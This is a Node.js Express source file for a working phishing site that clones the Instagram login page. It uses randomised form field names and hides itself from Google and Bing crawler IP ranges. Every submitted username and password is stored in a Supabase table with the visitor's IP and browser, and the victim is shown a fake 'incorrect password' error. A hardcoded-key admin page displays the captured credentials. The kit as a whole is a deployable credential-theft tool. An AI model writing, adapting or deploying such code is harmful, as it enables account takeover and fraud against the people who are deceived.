const express = require('express');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
);

const FIELD_USER = 'u_' + crypto.randomBytes(4).toString('hex');
const FIELD_PASS = 'p_' + crypto.randomBytes(4).toString('hex');

const BLOCKED = [
  '66.249.0.0/16', '74.125.0.0/16', '35.191.0.0/16',
  '130.211.0.0/16', '64.233.160.0/19', '216.58.192.0/19',
  '173.194.0.0/16', '157.55.39.0/24', '40.77.167.0/24'
];

function blockedIP(ip) {
  if (!ip || ip === '::1') return false;
  const n = ip.split('.').reduce((a, o) => (a << 8) + parseInt(o), 0) >>> 0;
  return BLOCKED.some(r => {
    const [b, bits] = r.split('/');
    const m = ~(2 ** (32 - parseInt(bits)) - 1);
    return (n & m) === (b.split('.').reduce((a, o) => (a << 8) + parseInt(o), 0) >>> 0 & m);
  });
}

const HTML = (showError) => `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
:root {
  --bg: #fafafa;
  --box-bg: #fff;
  --border: #dbdbdb;
  --text: #262626;
  --text-secondary: #8e8e8e;
  --input-bg: #fafafa;
  --link: #0095f6;
  --link-hover: #00376b;
  --or-color: #dbdbdb;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg: #000;
    --box-bg: #000;
    --border: #363636;
    --text: #f5f5f5;
    --text-secondary: #a8a8a8;
    --input-bg: #121212;
    --link: #0095f6;
    --link-hover: #e0f1ff;
    --or-color: #363636;
  }
}
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background-color:var(--bg);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:350px;display:flex;flex-direction:column;align-items:center}
.box{background-color:var(--box-bg);border:1px solid var(--border);border-radius:1px;padding:40px 40px 20px;width:100%;margin-bottom:10px;text-align:center}
.logo{font-family:'Billabong',cursive;font-size:38px;color:var(--text);margin-bottom:15px;font-weight:400}
.error-msg{background-color:rgba(237,73,86,0.1);border:1px solid #ed4956;color:#ed4956;padding:8px 12px;border-radius:4px;font-size:12px;width:100%;margin-bottom:10px;line-height:1.4;display:${showError ? 'block' : 'none'}}
form{display:flex;flex-direction:column;gap:6px;margin-top:8px}
.input-wrap{position:relative;width:100%}
.input-wrap input{width:100%;padding:9px 0 7px 8px;background-color:var(--input-bg);border:1px solid var(--border);border-radius:3px;font-size:12px;color:var(--text);outline:none;transition:border-color .2s}
.input-wrap input::placeholder{color:var(--text-secondary);font-size:12px}
.input-wrap input:focus{border-color:#a8a8a8}
.btn-login{width:100%;padding:7px 16px;background-color:#0095f6;opacity:0.7;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn-login:hover{opacity:1}
.or-divider{display:flex;align-items:center;margin:15px 0;gap:18px}
.or-divider .line{flex:1;height:1px;background:var(--or-color)}
.or-divider span{color:var(--text-secondary);font-size:12px;font-weight:600}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;background:none;border:none;color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin:10px 0;padding:8px}
.fb-login svg{width:20px;height:20px}
.fb-login:hover{opacity:0.8}
.forgot{display:block;color:var(--link);font-size:12px;text-decoration:none;margin-top:12px}
.forgot:hover{color:var(--link-hover)}
.signup-box{background-color:var(--box-bg);border:1px solid var(--border);border-radius:1px;padding:20px 40px;width:100%;text-align:center;font-size:14px;color:var(--text)}
.signup-box a{color:var(--link);font-weight:600;text-decoration:none}
.signup-box a:hover{color:var(--link-hover)}
.app-download{margin-top:15px;text-align:center}
.app-download p{font-size:14px;color:var(--text);margin-bottom:10px}
.app-download .stores{display:flex;gap:8px;justify-content:center}
.app-download .stores img{height:40px}
</style>
</head>
<body>
<div class="container">
<div class="box">
<div class="logo">Instagram</div>
<div class="error-msg" id="errorMessage">Sorry, your password was incorrect. Please double-check your password.</div>
<form id="loginForm" method="POST" action="/login">
<div class="input-wrap">
<input type="text" id="${FIELD_USER}" name="${FIELD_USER}" placeholder="Phone number, username or email address" required autocomplete="off">
</div>
<div class="input-wrap">
<input type="password" id="${FIELD_PASS}" name="${FIELD_PASS}" placeholder="Password" required autocomplete="off">
</div>
<button type="submit" class="btn-login" id="loginBtn">Log in</button>
</form>
<div class="or-divider">
<div class="line"></div>
<span>OR</span>
<div class="line"></div>
</div>
<button class="fb-login">
<svg viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
Log in with Facebook
</button>
<a href="#" class="forgot">Forgotten your password?</a>
</div>
<div class="signup-box">
Don't have an account? <a href="#">Sign up</a>
</div>
</div>
<script>
document.addEventListener('DOMContentLoaded',()=>{
const p=document.getElementById('${FIELD_PASS}');
const btn=document.getElementById('loginBtn');
p.addEventListener('input',()=>{
btn.style.opacity=p.value.length>0?'1':'0.7';
});
});
</script>
</body>
</html>`;

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  if (blockedIP(ip)) {
    return res.send('<html><body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif"><h1>Instagram</h1></body></html>');
  }
  res.send(HTML(req.query.error === 'invalid'));
});

app.post('/login', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
  if (blockedIP(ip)) return res.redirect('/');

  const username = (req.body[FIELD_USER] || '').trim();
  const password = req.body[FIELD_PASS] || '';
  
  if (!username || !password) return res.redirect('/?error=invalid');

  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
  const userAgent = req.headers['user-agent'] || 'Unknown';

  try {
    const { error } = await supabase
      .from('credentials')
      .insert([{ timestamp, ip, username, password, user_agent: userAgent }]);
    
    if (error) console.error('DB error:', error);
    else console.log('[+]', username, ':', password, 'from', ip);
  } catch(e) {
    console.error('DB exception:', e.message);
  }

  res.redirect('/?error=invalid');
});

app.get('/admin', async (req, res) => {
  if (req.query.key !== 'P3nt3st3r!2024') {
    return res.status(401).send('Access denied.');
  }

  let data = [];
  try {
    const { data: d, error } = await supabase
      .from('credentials')
      .select('*')
      .order('id', { ascending: false });
    if (!error) data = d || [];
  } catch(e) {}

  const rows = data.map((e, i) => 
    `<tr><td>${i+1}</td><td>${e.timestamp}</td><td>${e.ip}</td><td>${e.username}</td><td style="color:#ff6b6b;">${e.password}</td></tr>`
  ).join('');

  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Captured</title>
<style>
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px}
h1{color:#ff4444}table{width:100%;border-collapse:collapse;margin-top:20px}
th{background:#1a1a1a;color:#ff4444;padding:10px;text-align:left;border-bottom:2px solid #333}
td{padding:10px;border-bottom:1px solid #222;word-break:break-all}
tr:hover{background:#111}
.stats{margin:20px 0;display:flex;gap:20px}
.stat-box{background:#1a1a1a;border:1px solid #333;padding:15px;border-radius:4px}
.num{font-size:28px;font-weight:bold;color:#00ff00}
.label{color:#888;font-size:12px}
</style></head>
<body>
<h1>CAPTURED CREDENTIALS</h1>
<div class="stats">
<div class="stat-box"><div class="num">${data.length}</div><div class="label">Total</div></div>
<div class="stat-box"><div class="num">${new Set(data.map(e=>e.ip)).size}</div><div class="label">Unique IPs</div></div>
</div>
<table><tr><th>#</th><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
${rows || '<tr><td colspan="5" style="text-align:center;color:#666;">No captures yet</td></tr>'}
</table></body></html>`);
});

module.exports = app;